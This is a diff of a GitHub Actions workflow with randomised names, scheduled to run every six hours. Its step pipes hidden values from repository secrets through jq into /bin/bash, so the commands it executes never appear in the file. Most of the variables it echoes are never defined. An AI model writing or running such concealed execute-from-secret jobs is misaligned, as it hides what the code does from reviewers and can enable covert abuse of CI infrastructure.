@@ -1,20 +1,21 @@
 name: guoqingpao3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
-jobs:  # 4892
+    - cron: '38 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: guoqingpao3456
         env:
-          ojnuz706: ${{ secrets.ojnuz706 }}
+          nef4750: ${{ secrets.nef4750 }}
         run: |
-          echo $ojnuz706 | jq -r .jexa1 | /bin/bash
-          echo $p884 | jq -r .xja4 | /bin/bash
-          echo $kcidf0 | jq -r .lxk73913 | /bin/bash
-          echo $wisj6 | jq -r .ucpc80700 | /bin/bash
+          echo $nef4750 | jq -r .emrv01 | /bin/bash
+          echo $w8794 | jq -r .bulc3 | /bin/bash
+          echo $orpp1 | jq -r .jsvxw216 | /bin/bash
+          echo $eocb8202 | jq -r .huc826 | /bin/bash
+          echo $c0 | jq -r .racd2 | /bin/bash
 
